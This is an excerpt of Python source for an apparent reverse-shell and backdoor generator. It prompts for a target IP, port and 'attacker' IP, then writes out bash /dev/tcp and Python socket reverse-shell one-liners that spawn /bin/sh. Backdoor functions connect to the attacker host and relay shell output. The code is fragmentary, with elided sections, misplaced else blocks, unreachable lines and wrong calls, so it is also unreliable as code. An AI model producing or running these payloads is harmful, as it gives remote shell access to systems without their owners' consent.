...
def fcontinue(): #Check for enter input
    anyinput = raw_input("Press the [ENTER] key to continue ")
    if fcontinue ==  any:
        menu()
    else:
        menu()
...
def opfail(): #failing an operation/random input
    return bcolors.WARNING + """Operation failed! Please refer to the logging for more information...""" + bcolors.ENDC
    time.sleep(2)
    menu()
...
""" + bcolors.ENDC
    ...
    if usr == "1":
        ...
        print("Run Config")
        target = raw_input("What is the IP addr of the target?: ")
        port = raw_input("What port do you want to listen on?: ")
        attacker = raw_input("What is your hosting IP?: ")
        print('Your target is %s and you can listen on port %s. Your IP is: %s!' % (target, port, attacker))
        name = raw_input("What would you like the name of your file to be?: ")
...
|Enter an Option: """)
            ...
            if typ == "1":
                if prog == "Bash":
                    files = open("%s","w+" % name)
                    files.write("bash -i >& /dev/tcp/%s/%s 0>&1" % (attacker, port))
                    files.close
                ...
                if prog == "Python":
                    files = open("%s","w+" % name)
                    files.write("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""(attacker, port))
...
def login_credential():                     #used to prevent unathorized login form other people listening in the socket stream(tcp) connection, needs FAIL2BAN functionality
    global s
    pwd = s.recv(1024)
    s.send('Login: ')
    if pwd.strip() != passwd:
        return ('Password failed returning to login...')
    sleep.time(1)
    login_credential()
    else:
...
def shell():
    ...
    while True:
        ...
        s.send(output)
        s.send('>')
def backdoor_connect(): #FIRST STEP, connect to the attacker system and prompt login credentials
	global attacker
	global port 
	global s 
s.connect((attacker,port))
login()
def backdoor_listen_ONtarget():
	global target
	global port
	global s
    pass

#BACKDOOR LINUX VERSION===========================================================================================================================================================================
